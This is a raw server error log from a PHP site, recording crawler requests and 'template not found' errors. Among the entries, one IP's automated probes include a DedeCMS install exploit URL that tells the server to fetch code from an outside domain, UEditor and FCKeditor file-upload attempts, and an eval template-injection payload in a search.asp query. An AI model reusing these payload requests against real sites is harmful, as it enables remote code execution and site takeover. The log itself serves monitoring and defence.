---------------------------------------------------------------

[2022-06-05T00:32:29+08:00] 36.7.179.211 GET tool.ruyo.net/static/style/fonts/glyphicons-halflings-regular.eot?
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/static.html
---------------------------------------------------------------

[2022-06-05T01:05:51+08:00] 156.226.100.98 GET tool.ruyo.net/data/admin/allowurl.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
---------------------------------------------------------------

[2022-06-05T01:49:36+08:00] 14.157.112.17 GET tool.ruyo.net/static/style/fonts/glyphicons-halflings-regular.eot?
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/static.html
---------------------------------------------------------------

[2022-06-05T02:50:07+08:00] 185.135.73.12 POST tool.ruyo.net/Ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Ueditor.html
---------------------------------------------------------------

[2022-06-05T02:50:07+08:00] 185.135.73.12 POST tool.ruyo.net/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=skqmf.php&updateHost=http://www.asdqwd23.top/
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/install.html
---------------------------------------------------------------

[2022-06-05T02:50:07+08:00] 185.135.73.12 POST tool.ruyo.net/Ueditor/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Ueditor.html
---------------------------------------------------------------

[2022-06-05T02:50:07+08:00] 185.135.73.12 POST tool.ruyo.net/Ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Ueditor.html
---------------------------------------------------------------

[2022-06-05T02:50:07+08:00] 185.135.73.12 POST tool.ruyo.net/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/FCKeditor.html
---------------------------------------------------------------

[2022-06-05T02:50:08+08:00] 185.135.73.12 GET tool.ruyo.net/e/aspx/upload.aspx?a=pageadmin_cms
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/e.html
---------------------------------------------------------------

[2022-06-05T02:50:11+08:00] 185.135.73.12 GET tool.ruyo.net/SiteServer/Ajax/ajaxOtherService.aspx
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/SiteServer.html
---------------------------------------------------------------

[2022-06-05T02:50:12+08:00] 185.135.73.12 GET tool.ruyo.net/search.asp
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/search.html
---------------------------------------------------------------

[2022-06-05T02:50:12+08:00] 185.135.73.12 GET tool.ruyo.net/search.asp?searchword=%7Bif:eval(action)%7D99&action=Response.Write(Hex(665554))
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/search.html
---------------------------------------------------------------

[2022-06-05T03:13:15+08:00] 52.139.152.169 GET tool.ruyo.net/data/admin/allowurl.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
---------------------------------------------------------------

[2022-06-05T10:44:50+08:00] 222.186.43.74 GET tool.ruyo.net/data/admin/allowurl.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
---------------------------------------------------------------

[2022-06-05T15:46:07+08:00] 157.90.181.219 GET tool.ruyo.net/sitemap
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-06-05T15:46:10+08:00] 157.90.181.219 GET tool.ruyo.net/sitemap.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-06-05T16:22:38+08:00] 172.247.38.233 GET tool.ruyo.net/data/admin/allowurl.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
---------------------------------------------------------------

[2022-06-05T18:01:05+08:00] 40.77.167.38 GET tool.ruyo.net/sitemap.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-06-05T18:16:25+08:00] 207.46.13.75 GET tool.ruyo.net/atom.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/atom.html
---------------------------------------------------------------

[2022-06-05T18:41:29+08:00] 157.55.39.167 GET tool.ruyo.net/sitemap_index.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap_index.html
---------------------------------------------------------------

[2022-06-05T19:06:01+08:00] 207.46.13.66 GET tool.ruyo.net/sitemap.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-06-05T19:28:20+08:00] 40.77.167.36 GET tool.ruyo.net/sitemaps.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemaps.html
---------------------------------------------------------------

[2022-06-05T19:33:13+08:00] 207.46.13.66 GET tool.ruyo.net/sitemap.xml.gz
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-06-05T21:47:07+08:00] 182.144.183.153 POST tool.ruyo.net/favicon/
[ error ] [8]未定义变量: icANDmask
[ error ] [8]未定义数组下标: 0
[ error ] [8]未定义数组下标: 31
[ error ] [8]未定义数组下标: 30
[ error ] [8]未定义数组下标: 29
[ error ] [8]未定义数组下标: 28
[ error ] [8]未定义数组下标: 27
[ error ] [8]未定义数组下标: 26
[ error ] [8]未定义数组下标: 25
[ error ] [8]未定义数组下标: 24
[ error ] [8]未定义数组下标: 23
[ error ] [8]未定义数组下标: 22
[ error ] [8]未定义数组下标: 21
[ error ] [8]未定义数组下标: 20
[ error ] [8]未定义数组下标: 19
[ error ] [8]未定义数组下标: 18
[ error ] [8]未定义数组下标: 17
[ error ] [8]未定义数组下标: 16
[ error ] [8]未定义数组下标: 15
[ error ] [8]未定义数组下标: 14
[ error ] [8]未定义数组下标: 13
[ error ] [8]未定义数组下标: 12
[ error ] [8]未定义数组下标: 11
[ error ] [8]未定义数组下标: 10
[ error ] [8]未定义数组下标: 9
[ error ] [8]未定义数组下标: 8
[ error ] [8]未定义数组下标: 7
[ error ] [8]未定义数组下标: 6
[ error ] [8]未定义数组下标: 5
[ error ] [8]未定义数组下标: 4
[ error ] [8]未定义数组下标: 3
[ error ] [8]未定义数组下标: 2
[ error ] [8]未定义数组下标: 1
[ error ] [8]未定义数组下标: 0
